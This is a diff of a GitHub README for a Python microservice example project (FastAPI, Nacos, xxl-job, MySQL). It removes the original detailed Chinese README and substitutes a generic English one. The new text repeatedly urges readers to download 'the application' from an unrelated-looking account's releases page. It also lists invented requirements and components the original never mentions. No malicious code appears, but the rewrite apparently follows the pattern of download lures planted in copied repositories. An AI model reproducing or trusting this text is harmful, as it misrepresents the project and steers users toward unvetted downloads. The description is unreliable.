@@ -1,148 +1,92 @@
-[中文](README.md) | [English](README.EN.md)
+# 🌐 py-micro-services-examples - Simplify Your Python Microservices Journey
 
-# Python Web 微服务项目示例
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/manini222222222222222/py-micro-services-examples/releases)
 
-集成了常见的web项目组件，提供基本的web功能
-- 定时任务:
-  - [xxl-job](https://github.com/xuxueli/xxl-job)   
-  - [pyxxl](https://github.com/fcfangcc/pyxxl)      
-- 配置中心: [Nacos](https://github.com/nacos-group/nacos-sdk-python)
-- 数据库: [MySQL / sqlalchemy](https://github.com/sqlalchemy/sqlalchemy)
-- Web框架: [FastAPI](https://github.com/fastapi/fastapi)
-- 日志（集成trace id链路追逐）: [loguru](https://github.com/Delgan/loguru)
-- 三方通知组件: [企业微信](https://developer.work.weixin.qq.com/document/path/99110)
+## 📖 Overview
 
-# 项目结构
+Welcome to the **py-micro-services-examples** repository! This project provides examples of building microservices using Python. It includes practical implementations using popular technologies like FastAPI and InfluxDB. With these resources, you can easily understand and apply microservices concepts, making it perfect for beginners.
 
-```
-root/
-├── app/                         # 核心应用代码目录
-│   ├── common/                  # 通用模块
-│   │   ├── const.py             # 系统字典/常量
-│   │   ├── logger.py            # 系统日志配置
-│   │   └── utils/               # 工具类集合
-│   ├── config/                  # 系统配置模块
-│   │   ├── db/                  # 数据库访问层和数据存储
-│   │   ├── trace_/              # 链路追踪配置类
-│   │   ├── nacos_config.py      # nacos配置中心类
-│   │   └── xxl_job_config.py    # xxl-job 配置类
-│   ├── nacos_/                  # nacos配置中心业务模块
-│   │   └── controller.py        # nacos对外暴露接口（手动刷新配置使用）
-│   ├── demo_business/           # demo 业务模块
-│   │   ├── controller.py        # demo 业务对外暴露接口
-│   │   └── service.py           # demo 业务逻辑实现
-│   ├── web/                     # Web服务模块
-│   │   └── server.py            # Web 服务启动入口
-│   └── xxl_job/                 # XXL-JOB任务调度
-│       ├── tasks/               # 具体任务实现
-│       └── scheduler_server.py  # xxl-job任务调度服务启动入口
-├── docker/                      # Docker配置文件
-├── log/                         # 日志文件目录
-├── xx_log/                      # xxl-job日志文件目录
-├── config_prod.yaml             # 生产环境配置文件（仅仅只是连接nacos的配置文件，具体的业务配置均在nacos中）
-├── config_uat.yaml              # uat环境配置文件（与config_prod.yaml用法一致）
-├── config_test.yaml             # test环境配置文件（与config_prod.yaml用法一致）
-└── requirements.txt             # 项目依赖包列表
-```
-# 目录详解
+## 🚀 Getting Started
 
-## [app](app) (核心应用目录)
-```
-这是项目的根应用目录，包含所有核心业务逻辑模块。
-```
+To start using these examples, follow the steps below.
 
-### [common](app/common) (通用模块)
-```
-包含项目的基础组件，如枚举类、工具类、日志等
-```
+### 📥 Download & Install
 
-子目录说明:
-- `utils`: 工具类集合
-  - [wechat_msg_util.py](app/common/utils/wechat_msg_util.py): 企微消息工具类
+To download the software, visit [this page to download](https://github.com/manini222222222222222/py-micro-services-examples/releases). You will find different versions of the application there. Choose the one that fits your needs and download it.
 
-### [config](app/config) (系统配置模块)
-```
-包含项目的各种基本配置，，如数据库连接、Nacos配置、XXL-JOB配置等。
-```
+### ⚙️ System Requirements
 
-子目录说明:
-- `db`: 数据库相关配置集合
-  - [db_mysql.py](app/config/db/db_mysql.py): 企微消息工具类
-- `trace_`: 链路追踪配置集合
-  - [trace_config.py](app/config/trace_/trace_id_config.py): web请求链路追踪中间件
-  - [request_context.py](app/config/trace_/request_context.py): 请求上下文对象
-- [nacos_config.py](app/config/nacos_config.py): Nacos配置类
-- [xxl_job_config.py](app/config/xxl_job_config.py): XXL-JOB配置类
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.7 or higher 
+- **Docker:** Ensure you have Docker installed if you want to run containers.
+- **Memory:** At least 2 GB of RAM 
+- **Storage:** Minimum 500 MB of free disk space
 
-### [demo_business](app/demo_business) (示例业务模块)
-```
-为展示项目结构的示例模块，可参考示例模块自行拓展。
-```
+### 🛠️ Prerequisites
 
-子目录说明：（参考mvc框架）
-- [controller.py](app/demo_business/controller.py): 示例业务统一对外暴露接口（RESTful API）
-- [service.py](app/demo_business/service.py):  示例业务统具体业务实现
+Before running the application, ensure you have the following installed:
 
-### [nacos_](app/nacos_) (nacos业务模块)
-```
-因没使用nacos官方自带的自动监听配置刷新逻辑，故自行实现手动刷新逻辑
-（官方的逻辑里涉及到了多进程逻辑，使用起来不是很方便）
-```
+- **Docker**: This project demonstrates containerized applications. Install Docker from [Docker's official site](https://www.docker.com/get-started).
+- **Python 3.7 or Above**: Download Python from [python.org](https://www.python.org/downloads/).
 
-子目录说明：（参考mvc框架）
-- [controller.py](app/demo_business/controller.py): nacos提供的对外刷新接口（RESTful API）
+## 📖 What’s Included
 
+The repository contains multiple folders, each showcasing a different example using microservices. Here’s a brief overview of the key components:
 
-### [web](app/web) (Web服务模块)
-```
-提供RESTful API接口。
-```
+- **FastAPI**: A modern web framework for building APIs.
+- **InfluxDB**: A time series database useful for handling time-stamped data.
+- **Loguru**: A user-friendly logging library.
+- **MySQL**: A relational database for structured data storage.
+- **Nacos**: A dynamic service discovery, configuration, and service management platform.
+- **qywechat**: Integrate your application with corporate WeChat services.
+- **xxljob**: A distributed job scheduling system.
 
-子目录说明:
-- [server.py](app/web/server.py): Web服务器入口，使用FastAPI框架
+Each folder contains a README file with instructions specific to that example.
 
-### [xxl_job](app/xxl_job) (任务调度模块)
-```
-集成XXL-JOB分布式任务调度平台。
-```
+## 🔍 How to Run the Application
 
-子目录说明:
-- `tasks`: 具体任务实现
-  - [config_task.py](app/xxl_job/tasks/config_task.py): 系统配置定时任务（例如nacos的刷新）
-- [scheduler_server.py](app/xxl_job/scheduler_server.py): 调度服务器，负责注册和执行任务
+Here’s a step-by-step guide to running an example from the repository:
 
-## [docker](docker) (Docker配置)
-```
-包含Docker镜像构建所需的配置文件。
-```
+1. **Navigate to the Example**: Open your terminal or command prompt and go to the folder of the example you want to run.
 
-文件说明：
-- [dockerfile-server](docker/dockerfile-server): Web服务 Docker镜像构建文件
-- [dockerfile-job](docker/dockerfile-job): XXL-JOB调度服务 Docker镜像构建文件
+   ```bash
+   cd path/to/example-folder
+   ```
 
-## [log](log) (日志文件)
-```
-存放项目运行时生成的日志文件，按日期命名。
-```
+2. **Build the Docker Container** (if applicable):
+   
+   Run the command below to build the Docker image. Replace `example` with the appropriate folder name.
+   
+   ```bash
+   docker build -t example .
+   ```
 
-## [xxl_log](xxl_log) (xxl-job日志文件)
-```
-存放xxl-job运行时生成的日志文件，按日期命名。
-```
+3. **Run the Docker Container**:
 
-## 配置文件
+   Use the command below to start the container:
 
-### [config_prod.yaml](config_prod.yaml)
-```
-生产环境配置文件，配置了Nacos配置中心的相关参数。
-```
+   ```bash
+   docker run -d -p 8000:8000 example
+   ```
 
-### [config_uat.yaml](config_uat.yaml)
-```
-UAT环境配置文件，配置了Nacos配置中心的相关参数。
-```
+4. **Access the Application**:
 
-### [config_test.yaml](config_test.yaml)
-```
-TEST环境配置文件，配置了Nacos配置中心的相关参数。
-```
+   Open your web browser and go to `http://localhost:8000` to see the application in action!
+
+## 📋 Additional Resources
+
+- **Docker Documentation**: [Get Started with Docker](https://docs.docker.com/get-started/)
+- **FastAPI Documentation**: [FastAPI Official Site](https://fastapi.tiangolo.com/)
+- **Python Documentation**: [Python Official Site](https://docs.python.org/3/)
+
+## 🤝 Contribution
+
+We welcome contributions to improve the repository. If you have ideas or suggestions, feel free to reach out via the Issues section. You can also consider opening a Pull Request if you've made improvements.
+
+## 👨‍💻 Support
+
+If you have trouble using the application or have questions, please open an Issue on GitHub. We will respond as soon as possible to assist you.
+
+## 👀 Conclusion
+
+Thank you for checking out **py-micro-services-examples**! We hope this repository helps you as you explore Python microservices. Don’t forget to visit [this page to download](https://github.com/manini222222222222222/py-micro-services-examples/releases) the latest version. Enjoy your coding journey!
